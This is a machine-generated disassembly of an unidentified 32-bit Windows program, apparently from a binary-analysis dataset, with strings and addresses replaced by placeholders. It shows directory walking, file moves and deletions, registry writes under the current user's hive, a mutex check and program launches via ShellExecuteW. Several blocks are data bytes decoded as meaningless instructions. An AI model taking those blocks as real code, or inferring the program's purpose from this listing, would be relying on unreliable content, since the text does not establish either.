lea eax [ ebp - 0x210 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp edi 0x4
sete al
and al [ ebp - 0x7 ]
cmp al 0x1
jne r-xdata
sub_4a4638
push ebp
mov ebp esp
add esp 0xfffffd84
push ebx
xor ecx ecx
mov [ ebp - 0x27c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
lea eax [ ebp - 0x278 ]
mov edx [ r-xdata ]
call sub_407d18
xor eax eax
push ebp
push sub_4a472d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x27c ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x27c ]
lea ecx [ ebp - 0x278 ]
mov edx 0x10
call sub_412194
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4734
lea eax [ ebp - 0x27c ]
call j_sub_4068a0
lea eax [ ebp - 0x278 ]
mov edx [ r-xdata ]
call sub_407df0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
xor eax eax
push ebp
push sub_4a46f4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x278 ]
call sub_4121e4
test eax eax
je r-xdata
mov edx [ ebp - 0x264 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x268 ]
and eax 0x10
cmp eax 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x278 ]
call sub_412208
retn
sub_4a4750
push ebp
mov ebp esp
mov ecx 0x55
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x27c ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
lea eax [ ebp - 0x278 ]
mov edx [ r-xdata ]
call sub_407d18
xor eax eax
push ebp
push sub_4a49ea
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4a49a4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x284 ]
call sub_4a3c9c
mov edx [ ebp - 0x284 ]
mov eax [ ebp - 0x4 ]
call sub_407768
je r-xdata
call sub_4a3b54
test al al
je r-xdata
lea edx [ ebp - 0x288 ]
mov eax [ ebp - 0x4 ]
call sub_4110f8
mov eax [ ebp - 0x288 ]
push eax
lea eax [ ebp - 0x290 ]
call sub_4a3d50
mov eax [ ebp - 0x290 ]
lea edx [ ebp - 0x28c ]
call sub_4110f8
mov eax [ ebp - 0x28c ]
pop edx
call sub_407ae0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x294 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x294 ]
lea ecx [ ebp - 0x278 ]
mov edx 0x1ff
call sub_412194
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a49f1
lea eax [ ebp - 0x2a8 ]
mov edx 0xa
call j_sub_4068c4
lea eax [ ebp - 0x278 ]
mov edx [ r-xdata ]
call sub_407df0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
lea eax [ ebp - 0x278 ]
call sub_412208
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x280 ] eax
xor eax eax
push ebp
push sub_4a4993
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x280 ]
mov eax [ ebp - 0x4 ]
call sub_4a4638
mov eax [ ebp - 0x280 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x264 ]
mov edx [ ebp - 0x4 ]
call sub_407564
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x27c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x27c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax 0x64
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x280 ]
call sub_4055f0
retn
inc esi
xor ebx ebx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
lea eax [ ebp - 0x278 ]
call sub_4121e4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x29c ]
mov edx ebx
mov eax [ ebp - 0x280 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x29c ]
mov edx r-xdata
call sub_407768
je r-xdata
lea ecx [ ebp - 0x298 ]
mov edx ebx
mov eax [ ebp - 0x280 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x298 ]
mov edx r-xdata
call sub_407768
je r-xdata
lea ecx [ ebp - 0x2a8 ]
mov edx ebx
mov eax [ ebp - 0x280 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x2a8 ]
lea eax [ ebp - 0x2a4 ]
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x2a4 ]
lea edx [ ebp - 0x2a0 ]
call sub_417b44
mov eax [ ebp - 0x2a0 ]
mov edx [ ebp - 0x27c ]
call sub_4a4750
sub_4a4a38
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4a4ad7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_407564
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_407564
mov edx [ ebp - 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4ade
lea eax [ ebp - 0xc ]
mov edx 0x3
call j_sub_4068c4
retn
sub_4a4bd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push j_sub_405fd0#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4a4ea8
mov eax [ ebp - 0x4 ]
call sub_4a4c20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4c1a
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4a4c20
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push j_sub_405fd0#8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4a4e09
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4a4df8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4070fc
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407ae0
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4dff
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4a4a38
lea eax [ ebp - 0x14 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_407564
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea eax [ ebp - 0x18 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x18 ]
call sub_41207c
test al al
je r-xdata
mov ecx r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x20 ]
call sub_407134
push eax
lea eax [ ebp - 0x24 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x24 ]
call sub_407134
push eax
call MoveFileW
lea eax [ ebp - 0x28 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x28 ]
call sub_41207c
test al al
je r-xdata
mov ecx r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x1c ]
call sub_407134
push eax
call DeleteFileW
lea edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a10cc
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_407564
mov edx [ ebp - 0x34 ]
pop eax
call sub_4a3e04
lea eax [ ebp - 0x38 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x38 ]
call sub_4a3d8c
mov ecx r-xdata
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x3c ]
call sub_4a3d8c
lea eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x40 ]
call sub_4a3d8c
lea eax [ ebp - 0x2c ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_407564
mov eax [ ebp - 0x2c ]
call sub_407134
push eax
call DeleteFileW
sub_4a4dff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4e42
lea eax [ ebp - 0x40 ]
mov edx 0xd
call j_sub_4068c4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4a4e0e
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4e42
lea eax [ ebp - 0x40 ]
mov edx 0xd
call j_sub_4068c4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4a4ea8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4a4f7f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4a4f57
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push j_sub_405fd0#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4a4750
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4f4d
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
call sub_4a41b4
inc esi
dec ebx
jne r-xdata
sub_4a4f4d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4f86
lea eax [ ebp - 0xc ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4a4f90
push ebp
mov ebp esp
add esp 0xfffffee4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x118 ] edx
mov [ ebp - 0x11c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4a50b0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4a5088
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x8000
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x108 ] eax
xor eax eax
mov [ ebp - 0x104 ] eax
fild [ ebp - 0x108 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
call sub_404624
fstp [ ebp - 0x114 ]
fwait
push 0x4000
push 0x80000000
push 0x0
call sub_404624
fld [ ebp - 0x114 ]
fdivrp st1
fadd [ r-xdata ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea ecx [ ebp - 0x100 ]
xor edx edx
mov eax 0x2
call sub_404ffc
lea eax [ ebp - 0x11c ]
lea edx [ ebp - 0x100 ]
call sub_4073f4
mov eax [ ebp - 0x11c ]
call sub_411b70
mov edx eax
lea eax [ ebp - 0x118 ]
call sub_407214
lea eax [ ebp - 0x118 ]
mov edx r-xdata
call sub_4074a4
mov eax [ ebp - 0x118 ]
call sub_4a4bd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a50b7
lea eax [ ebp - 0x11c ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4a50d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
mov eax [ ebp - 0x8 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4a5201
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
xor eax eax
push ebp
push j_sub_405d1c#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_444aac
mov [ ebp - 0x10 ] eax
mov edx 0x80000001
mov eax [ ebp - 0x10 ]
call sub_444b94
xor eax eax
push ebp
push sub_4a51c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov cl 0x1
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_444cdc
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_444b64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a51ca
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_445c94
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4455f4
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_44570c
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_407768
je r-xdata
mov [ ebp - 0x9 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4455f4
jmp r-xdata
sub_4a51ca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5208
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4a51d9
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5208
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4a527c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax 0x104
call sub_404204
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x0
call SHGetSpecialFolderLocation
push ebx
mov eax [ ebp - 0x4 ]
push eax
call SHGetPathFromIDListW
mov eax edi
mov edx ebx
call sub_407254
mov eax ebx
call sub_404220
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a52c0
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
mov eax [ ebp - 0x8 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4a541b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4a2e6c
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_409cf8
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_409cf8
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x50 ]
lea edx [ ebp - 0xc ]
mov eax 0x7
call sub_4a527c
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_407648
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x1c ]
call sub_40730c
call sub_4a3ad8
test al al
je r-xdata
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_4072f8
mov eax [ ebp - 0x2c ]
call sub_41207c
test al al
jne r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x1c ]
call sub_4072f8
mov eax [ ebp - 0x24 ]
call sub_41207c
test al al
je r-xdata
xor ebx ebx
push 0x0
mov eax [ ebp - 0x1c ]
call sub_406f20
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov bl 0x1
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x1c ]
call sub_4072f8
mov eax [ ebp - 0x28 ]
call sub_407134
push eax
call DeleteFileW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5422
lea eax [ ebp - 0x2c ]
mov edx 0x4
call j_sub_4068c4
lea eax [ ebp - 0x1c ]
call sub_406d54
lea eax [ ebp - 0x18 ]
call sub_409cb4
lea eax [ ebp - 0x14 ]
call sub_409cb4
lea eax [ ebp - 0x10 ]
call sub_409cb4
lea eax [ ebp - 0xc ]
mov edx 0x3
call j_sub_4068c4
retn
sub_4a5474
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
mov eax [ ebp - 0x8 ]
call j_sub_406bfc
xor eax eax
push ebp
push j_sub_405fd0#6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4a50d8
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a54ee
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4a52c0
mov ebx eax
sub_4a54fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
push esi
dec edx
add [ eax ] al
add [ eax ] al
add [ eax + 0x4a55 ] dl
add [ eax ] al
add [ ebp + edx * 2 + 0x64004a ] dh
add [ eax ] al
and ch bl
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
sub_4a56b4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push j_sub_405fd0#5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_4a57d7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a10cc
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_41239c
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a10cc
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_4123d8
push [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_407648
mov eax [ ebp - 0x4 ]
call sub_41207c
test al al
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a10cc
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x4 ]
call sub_41239c
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push 0x1
push r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push r-xdata
mov eax ebx
call sub_479ce0
push eax
call ShellExecuteW
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x3
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5803
lea eax [ ebp - 0x18 ]
mov edx 0x6
call j_sub_4068c4
retn
push 0x1
push r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push r-xdata
mov eax ebx
call sub_479ce0
push eax
call ShellExecuteW
sub_4a582c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push j_sub_405fd0#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4a58b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4a3bc0
mov eax [ ebp - 0x4 ]
call sub_41207c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a10cc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4a3e04
mov eax [ ebp - 0x4 ]
call sub_41207c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a58e5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
mov cl 0x1
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_4a5474
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
mov eax [ ebp - 0x4 ]
call sub_4a3d8c
sub_4a5904
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_4a59a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor edx edx
push ebp
push sub_4a5981
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_470e50
mov eax [ ebp - 0x8 ]
call sub_407134
push eax
push 0x0
push 0x1f0001
call OpenMutexW
test eax eax
setne [ ebp - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_470e50
mov eax [ ebp - 0xc ]
call sub_407134
push eax
push 0x0
push 0x0
call sub_40ba10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a59ad
lea eax [ ebp - 0xc ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4a59b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
xor eax eax
push ebp
push j_sub_405fd0#3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_405d1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4a5a57
push [ fs : eax ]
mov [ fs : eax ] esp
mov cl 0x1
mov dl 0x1
xor eax eax
call sub_4a44d4
mov [ ebp - 0x4 ] eax
call sub_4a3ad8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5a5e
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4a4bd0
inc esi
dec ebx
jne r-xdata
sub_4a5a5e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5a8f
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
sub_4a5a9c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ edx + ecx * 2 ]
or [ edx + ecx * 2 ] bl
sub bl [ edx + ecx * 2 ]
dec edi
pop esp
dec edx
add [ edi + 0x5c ] dl
dec edx
add [ ebx + eax - 0x6200000 ] dl
dec eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
sub_4a5d88
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push j_sub_405d1c#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edx
call sub_4a4f90
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a59b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4a5dc8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4a5e50
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x388 ]
xor edx edx
call sub_4575d4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4a582c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4a5904
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a59b8
mov eax [ ebx + 0x388 ]
call sub_4055f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a08fc
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4a5e64
push ebx
add [ eax ] al
add [ esi + ebx * 2 + 0x4a ] bh
add bl bl
adc [ eax ] eax
add [ ecx ] dl
dec edx
add [ eax + eax ] cl
add [ eax + 0x4aa8 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x4a
add ah bh
cmpsb [ esi ] [ edi ]
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 4 - 0x3803ffb6 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
